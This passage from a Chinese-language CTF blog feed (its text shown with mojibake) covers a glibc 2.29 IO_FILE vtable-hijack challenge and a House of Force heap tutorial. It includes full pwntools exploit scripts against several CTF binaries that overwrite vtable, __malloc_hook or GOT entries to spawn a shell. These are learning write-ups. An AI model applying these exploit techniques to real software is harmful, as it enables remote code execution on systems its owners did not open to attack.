0048| 0x7fffffffe320 --&gt; 0x1# 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a (&quot;/media/psf/mypwn/ahys/6/springboard/springboard&quot;)# 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0# 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push   rbp)# 0080| 0x7fffffffe340 --&gt; 0x0# 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42# 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor    ebp,ebp)# 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1# 0112| 0x7fffffffe360 --&gt; 0x0# 0120| 0x7fffffffe368 --&gt; 0x0# 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42# 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42# 0144| 0x7fffffffe380 --&gt; 0x0# 0152| 0x7fffffffe388 --&gt; 0x0# 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830</code></pre><h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>è€ƒç‚¹å°±æ˜¯<code>IO_FILE</code>çš„ç›¸å…³çŸ¥è¯†äº†ï¼Œæ˜¯é’ˆå¯¹ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹ã€‚</p><p>è¿™ä¸ªé¢˜ä¼°è®¡æ˜¯å‚è€ƒ<a href="https://xz.aliyun.com/t/7205" target="_blank" rel="noopener">https://xz.aliyun.com/t/7205</a>è¿™ä¸ªé¢˜å‡ºçš„ï¼Œä½†æ˜¯æ–‡ä¸­çš„é¢˜æ¯”è¿™ä¸ªè¦éš¾å¤šäº†ã€‚ï¼ˆpsï¼šæ„Ÿè°¢å‡ºé¢˜äººæ‰‹ä¸‹ç•™æƒ…ï¼‰</p><h4 id="fclose-å‡½æ•°è°ƒç”¨çš„-vtable-å‡½æ•°"><a href="#fclose-å‡½æ•°è°ƒç”¨çš„-vtable-å‡½æ•°" class="headerlink" title="fclose å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•°"></a>fclose å‡½æ•°è°ƒç”¨çš„ vtable å‡½æ•°</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/QSynPX.png" srcset="/img/loading.gif" alt></p><p>vtable å‡½æ•° æŒ‡é’ˆï¼š</p><pre><code>/* The &#39;finish&#39; function does any final cleaning up of an _IO_FILE object.   It does not delete (free) it, but does everything else to finalize it.   It matches the streambuf::~streambuf virtual destructor.  */typedef void (*_IO_finish_t) (FILE *, int); /* finalize */#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)#define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0)struct _IO_jump_t{    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow);    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);};</code></pre><p>å¯¹äºæ”»å‡»çš„vtable å‡½æ•° æŒ‡é’ˆå…¶ä¸­çš„ï¼š</p><ul><li><code>__finish__</code></li><li><code>__close</code></li></ul><p>å…¶æ‰§è¡Œé¡ºåºæ˜¯å…ˆcloseï¼Œç„¶åfinishã€‚ç”±äºç¨‹åºç»™çš„æ˜¯0x18å­—èŠ‚çš„ä»»æ„å†™ï¼Œæ”»å‡» <code>__finish__</code>å°±å¯ä»¥äº†ã€‚</p><h4 id="libc2-29ä¸­çš„vtable"><a href="#libc2-29ä¸­çš„vtable" class="headerlink" title="libc2.29ä¸­çš„vtable"></a>libc2.29ä¸­çš„vtable</h4><p>vtableçš„å€¼ï¼Œä»¥åŠå…¶å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨glibc 2.29ä¸‹æ˜¯å¯å†™çš„ã€‚è¿™ä¸ªæ˜¯å¾ˆé‡è¦çš„ä¸€ç‚¹ï¼Œæœ¬æ¥ä¸ªäººä¸çŸ¥é“è¿™ä¸ªï¼Œæƒ³äº†å¥½ä¹…å…¶ä»–çš„åŠæ³•æ¥åˆ©ç”¨ã€‚</p><p><strong>åœ¨glibc 2.23ä»¥åŠglibc 2.27å…¶éƒ½æ˜¯ä¸å¯å†™çš„</strong>ã€‚</p><p>æ­£æ˜¯å› ä¸ºå¯ä»¥å†™ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜éš¾åº¦å°±é™ä½äº†å¾ˆå¤šã€‚</p><h4 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p>åˆ©ç”¨ç¨‹åºçš„æœ€åä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œç›´æ¥æŠŠ<code>__IO_2_1_stderrçš„vtable</code>ä¸Š<code>__finish__</code>æŒ‡é’ˆä¿®æ”¹ä¸ºone gadgetã€‚<br>ï¼ˆè¿™é‡Œçš„one gadgetï¼Œéœ€è¦è‡ªå·±å¤šè¯•ï¼‰ã€‚</p><h5 id="å°tips"><a href="#å°tips" class="headerlink" title="å°tips"></a>å°tips</h5><p>ç¬¬2æ¬¡çš„2å­—èŠ‚è¯»å…¥å¯ä»¥ç›´æ¥ç”¨å…¶æœ¬æ¥åœ°å€æœ«2å­—èŠ‚å³å¯ï¼Œç›´æ¥åœ¨<code>__IO_2_1_stderrçš„vtable</code>ä¸ç”¨è½¬ç§»ä¹Ÿå¯ä»¥çš„ã€‚ï¼ˆçœ‹åˆ°æœ‰åˆ«çš„å¸ˆå‚…è½¬ç§»åˆ°å…¶ä»–vtableåœ°å€çš„ã€‚ï¼‰å¹¶ä¸”ï¼Œç”±äºæ˜¯readå‡½æ•°ï¼Œç›´æ¥å‘ä¸ª<code>\x60</code>ä¸€ä¸ªå­—èŠ‚å³å¯ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./secret&#39;local_libc  = &#39;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#39;remote_libc = &#39;./libc6_2.29-0ubuntu2_amd64.so&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10030)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()ru(&quot;0x&quot;)libc_base = int(r(12),16) - libc.symbols[&quot;printf&quot;]info_addr(&quot;libc_base&quot;,libc_base)ru(&quot;addr&quot;)vtable = 0x1e5758 + libc_bases(p64(vtable))sleep(0.1)# debug()s(&#39;\x60&#39;)sleep(0.1)rec = 0xe2386 + libc_bases(p64(0) + p64(0)+p64(rec))itr()</code></pre><p>ç”±äºæå‰å°±<code>fclose(stdout)</code>,getshellä»¥åä¹Ÿä¸ä¼šæœ‰ä»»ä½•çš„è¾“å‡ºï¼Œæ‰€ä»¥å¾—ç”¨<code>exec 1&gt;&amp;2</code>æ¥æ¢å¤è¾“å‡ºã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTFå®‰æ’æœˆèµ›-6th&quot;&gt;&lt;a href=&quot;#DASCTFå®‰æ’æœˆèµ›-6th&quot; class=&quot;headerlink&quot; title=&quot;DASCTFå®‰æ’æœˆèµ›(6th)&quot;&gt;&lt;/a&gt;DASCTFå®‰æ’æœˆèµ›(6th)&lt;/h1&gt;&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;#R
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>House of Force</title>
    <link href="http://chumen77.xyz/2020/05/13/House%20of%20Force/"/>
    <id>http://chumen77.xyz/2020/05/13/House of Force/</id>
    <published>2020-05-13T13:30:55.952Z</published>
    <updated>2020-08-13T13:22:05.298Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åŸºæœ¬æŒ‰ç…§è¿™wikiä¸Šé¢å­¦çš„ï¼Œç®€å•è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/J22cKM.png" srcset="/img/loading.gif" alt></p><h3 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h3><ul><li>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</li><li>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°<h3 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h3>House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼šè¿›è¡Œå †åˆ†é…æ—¶,å¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚,é‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚</li></ul><p>æ‰€ä»¥å½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆ?ç­”æ¡ˆæ˜¯,å¯ä»¥ä½¿å¾— top chunkæŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®,è¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚</p><pre><code>// è·å–å½“å‰çš„top chunkï¼Œå¹¶è®¡ç®—å…¶å¯¹åº”çš„å¤§å°victim = av-&gt;top;size   = chunksize(victim);// å¦‚æœåœ¨åˆ†å‰²ä¹‹åï¼Œå…¶å¤§å°ä»ç„¶æ»¡è¶³ chunk çš„æœ€å°å¤§å°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿›è¡Œåˆ†å‰²ã€‚if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;}</code></pre><p>æ‰€ä»¥ï¼Œå¦‚æœå¯ä»¥ç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼,å°±å¯ä»¥è½»æ¾çš„é€šè¿‡è¿™ä¸ªéªŒè¯,è¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢è¯´çš„éœ€è¦ä¸€ä¸ªèƒ½å¤Ÿæ§åˆ¶top chunk size åŸŸçš„æ¼æ´ã€‚</p><h2 id="ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•"><a href="#ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•" class="headerlink" title="ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•"></a>ä¸€èˆ¬çš„åˆ©ç”¨åŠæ³•</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/MW2ASE.png" srcset="/img/loading.gif" alt></p><pre><code>remainder      = chunk_at_offset(victim, nb);av-&gt;top        = remainder;/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</code></pre><p>ä¹‹åè¿™é‡Œä¼šæŠŠ top chunkçš„ æŒ‡é’ˆæ›´æ–°ï¼Œæ¥ä¸‹æ¥çš„å †å—å°±ä¼šåˆ†é…åˆ°è¿™ä¸ªä½ç½®ï¼Œç”¨æˆ·åªè¦æ§åˆ¶äº†è¿™ä¸ªæŒ‡é’ˆå°±ç›¸å½“äºå®ç°ä»»æ„åœ°å€å†™ä»»æ„å€¼(write-anything-anywhere)ã€‚</p><h2 id="ç®€å•å®ä¾‹"><a href="#ç®€å•å®ä¾‹" class="headerlink" title="ç®€å•å®ä¾‹"></a>ç®€å•å®ä¾‹</h2><h3 id="è®©top-chunk-çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢-ä½åœ°å€-çš„gotè¡¨ä¸­çš„å†…å®¹"><a href="#è®©top-chunk-çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢-ä½åœ°å€-çš„gotè¡¨ä¸­çš„å†…å®¹" class="headerlink" title="è®©top chunk çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„gotè¡¨ä¸­çš„å†…å®¹"></a>è®©top chunk çš„æŒ‡é’ˆå‡å°æ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„gotè¡¨ä¸­çš„å†…å®¹</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/DKC4bL.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªæ ¸å¿ƒå°±æ˜¯æ¥ç¼©å°top chunk çš„æŒ‡é’ˆï¼Œæ¥ä¿®æ”¹ä½äºå…¶ä¸Šé¢(ä½åœ°å€) çš„æŸå¤„ä¸­çš„å†…å®¹ã€‚è¿™é‡Œå¯èƒ½æ˜¯heapçš„æŒ‡é’ˆï¼Œgotè¡¨ã€‚</p><p><strong>è¿™å…¶ä¸­æœ‰ä¸ªéš¾ç¼ çš„é—®é¢˜å°±æ˜¯ç»“æ„ä½“å¯¹é½é—®é¢˜ï¼Œç›®å‰æˆ‘æ‰€ç»ƒä¹ åˆ°çš„é¢˜é‡åˆ°è¿™ä¸ªé—®é¢˜çš„éƒ½æ˜¯ï¼Œå‡å»ä¸€ä¸‹<code>SIZE_SZ</code>ï¼ˆ64ä½æ˜¯8 ï¼Œ32ä½æ˜¯4ï¼‰ã€‚</strong></p><h3 id="è®©é‚£ä¸ªtop-chunk-æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹"><a href="#è®©é‚£ä¸ªtop-chunk-æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹" class="headerlink" title="è®©é‚£ä¸ªtop chunk æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹"></a>è®©é‚£ä¸ªtop chunk æŒ‡é’ˆå¢å¤§æ¥ä¿®æ”¹ä½äºé«˜åœ°å€ç©ºé—´çš„å†…å®¹</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/s1Uuan.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªæ˜¯è¾ƒå¥½ç†è§£çš„ï¼Œå¸¸ç”¨ä¿®æ”¹libcä¸Šé¢æŸå¤„çš„åœ°å€ã€‚</p><h2 id="hitcon-training-bamboobox"><a href="#hitcon-training-bamboobox" class="headerlink" title="hitcon-training-bamboobox"></a>hitcon-training-bamboobox</h2><p>ä¸»è¦æ˜¯ä¿®æ”¹ä¸€ä¸‹ï¼Œå¼€å§‹ç¨‹åºè‡ªåŠ¨åˆ›å»ºçš„å­˜æ”¾2ä¸ªå‡½æ•°æŒ‡é’ˆçš„å †ï¼Œå…¶ä¸­hello-messageç”¨äºç¨‹åºå¼€å§‹æ—¶ä½¿ç”¨ï¼Œgoodbye-message ç”¨äºåœ¨ç¨‹åºç»“æŸæ—¶ä½¿ç”¨ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>æ·»åŠ å †å—ï¼Œåˆ©ç”¨å †æº¢å‡ºæ¼æ´è¦†ç›– top chunk çš„å¤§å°ä¸º -1ï¼Œå³ 64 ä½æœ€å¤§å€¼ã€‚</li><li>åˆ©ç”¨ house of force æŠ€å·§ï¼Œåˆ†é… chunk è‡³å †çš„åŸºåœ°å€ã€‚</li><li>è¦†ç›– goodbye-message ä¸ºmagic å‡½æ•°åœ°å€æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bamboobox&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 1if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25784)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;item name:&#39;,str(size))    sa(&#39;item&#39;,str(content))def free(id):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;item&#39;,str(id))def show(id):    sla(&#39;choice&#39;,&#39;1&#39;)def edit(id,size,content):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;item&#39;,str(id))    sla(&#39;item name&#39;,str(size))    sa(&#39;item&#39;,str(content))context.log_level = &#39;debug&#39;magic = 0x400d49add(0x30,&#39;chum&#39;)payload = &#39;a&#39; * 0x30 +p64(0) + p64(0xffffffffffffffff)edit(0,0x40,payload)size = -(0x40 + 0x20) - 0x10add(size,&#39; &#39;)payload = p64(0x400d49) + p64(0x400d49)add(0x10,payload)# sla(&#39;choice:&#39;,&#39;5&#39;)itr()</code></pre><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf-2020-force"></a>gyctf-2020-force</h2><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/uYKO6A.png" srcset="/img/loading.gif" alt><br>å¯ä»¥å®ç°å †æº¢å‡ºã€‚å¹¶ä¸”åœ¨ä½ ç”³è¯·ä¸€ä¸ªå †å—ä»¥åï¼Œç¨‹åºä¼šç»™ä½ æ‰“å°å‡ºå †å—çš„åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥æ³„éœ²å‡ºä¿¡æ¯ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>ç”³è¯·ä¸€ä¸ªå¾ˆå¤§å †ï¼Œç„¶åç¨‹åºä¼šmmapå¼€å¯ä¸€ä¸ªå †å—ï¼Œæ­¤æ—¶å°±å¯ä»¥æ³„æ¼å‡ºlibcçš„åœ°å€ã€‚</li><li>HOF</li><li><code>__malloc_hook</code> + one gadget</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;local_file  = &#39;./gyctf_2020_force&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 0if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29457)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,date):    sla(&#39;2:puts&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    ru(&#39;bin addr 0x&#39;)    heapaddr = int(r(12),16)    info_addr(&#39;heapaddr&#39;,heapaddr)    sa(&#39;content&#39;,str(date))    return heapaddrpayload = 0x30 * &#39;a&#39; + p64(0) + p64(0xffffffffffffffff)libc_base = add(0x200000,&#39;111&#39;) + 0x200ff0info_addr(&#39;libc_base&#39;,libc_base)malloc_hook = libc_base + 0x3c4b10heapaddr = add(0x30,payload)size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8print(&#39;size----&gt;&#39;+hex(size))add(size,&#39;a&#39;)rce = rce16[1] + libc_basepayload = p64(0) + p64(rce) + p64(libc_base + libc.symbols[&#39;__libc_realloc&#39;] + realloc[1])add(0x20,payload)sla(&#39;2:puts&#39;,&#39;1&#39;)sla(&#39;size&#39;,&#39;30&#39;)# dbg()itr()</code></pre><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a><code>bcloud_bctf_2016</code></h2><p>è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªååˆ†ç²¾å¦™çš„é¢˜ï¼Œæ¼æ´å‡ºç°åœ¨ç¨‹åºåˆå§‹åŒ–ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/JMsnrt.png" srcset="/img/loading.gif" alt></p><p>strcpyæ˜¯ä»¥<code>\x00</code>æ¥åˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç»“æŸçš„ã€‚<br>åœ¨æ ˆä¸­ï¼Œå½“è¾“å…¥0x40ä¸ªå­—ç¬¦æ—¶ï¼Œå› ä¸ºv2æ­£å¥½åœ¨sä¸‹é¢ï¼Œè¿™å°±è®©strcpyä»så¾€v2ä¸Šé¢å¤åˆ¶æ—¶ä¼š<strong>æŠŠè¿™ä¸ªå †å—çš„åœ°å€ä¹Ÿç»™å¤åˆ¶ä¸Šå»</strong>ï¼Œå½“å…¶è¿”å›nameæ—¶ï¼Œä¹Ÿå°±è¿”å›äº†å †å—åœ°å€ï¼Œç„¶åå°±å¯ä»¥ç®—å‡ºå †å—çš„åŸºåœ°å€ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/5n1Rtx.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BGZjNT.png" srcset="/img/loading.gif" alt></p><p>åˆ°äº†è¿™ä¸ªä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´ï¼Œå¡«å……å®Œ0x40ä¸ªå­—ç¬¦åï¼Œä¼šæŠŠorgå †å—çš„æŒ‡é’ˆå’Œv3é‡Œé¢çš„å†…å®¹ç»™å¤åˆ¶åˆ°orgå¯¹åº”çš„å †å—é‡Œï¼Œä¹Ÿå°±æ˜¯0x40 + 4 + len(v3)å­—èŠ‚çš„ä¸œè¥¿ã€‚orgåœ¨å †å—æ’å¸ƒä¸­ä¹Ÿæ˜¯æœ€åä¸€ä¸ªï¼Œå¦‚æœä¼ è¿‡å»<code>0xffffffff</code>,å°±å¯ä»¥æ”¹åˆ°top chunkçš„sizeä½ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯-2"><a href="#åˆ©ç”¨æ€è·¯-2" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><ul><li>leakå †å—base</li><li>ä¿®æ”¹top chunk size</li><li>hofåˆ°heaplistå¤„</li><li>ç»™heaplistå†™ä¸Šfree gotï¼Œç”¨editï¼Œä¿®æ”¹å…¶ä¸ºputs</li><li>æ³„æ¼libcåœ°å€</li><li>ä¿®æ”¹free got ä¸ºsystemï¼Œç„¶åæŒ‡å‘<code>/bin/sh\x00</code></li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *import timelocal_file  = &#39;./bcloud_bctf_2016&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6debug = 0if debug:    io = process(local_file)    context.log_level = &#39;debug&#39;    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27301)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def name(name):    sa(&#39;name&#39;,str(name))    ru(&#39;b&#39;)    heapbase = uu32(r(4)) - 0x8    info_addr(&#39;heapbase&#39;,heapbase)    return heapbasedef org(org,host):    sa(&#39;Org:&#39;,str(org))    sla(&#39;Host:&#39;,str(host))def add(size,content):    sla(&#39;option---&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;length&#39;,str(size))    sa(&#39;content:&#39;,str(content))def edit(id,content):    sla(&#39;---&gt;&gt;&#39;,&#39;3&#39;)    sla(&#39;id&#39;,str(id))    sa(&#39;the new content&#39;,str(content))def free(id):    sla(&#39;-&gt;&#39;,&#39;4&#39;)    